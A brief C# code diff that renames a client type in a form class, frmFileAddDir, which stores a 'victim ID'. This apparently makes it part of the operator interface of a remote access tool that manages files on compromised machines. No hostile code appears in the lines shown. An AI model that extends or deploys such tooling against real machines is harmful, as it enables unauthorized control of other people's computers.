@@ -12,10 +12,10 @@ namespace Eden
 {
     public partial class frmFileAddDir : Form
     {
-        public Client m_clnt;
+        public clsClient m_clnt;
         public string m_szVictimID;
 
-        public frmFileAddDir(Client clnt, string szVictimID)
+        public frmFileAddDir(clsClient clnt, string szVictimID)
         {
             InitializeComponent();
 
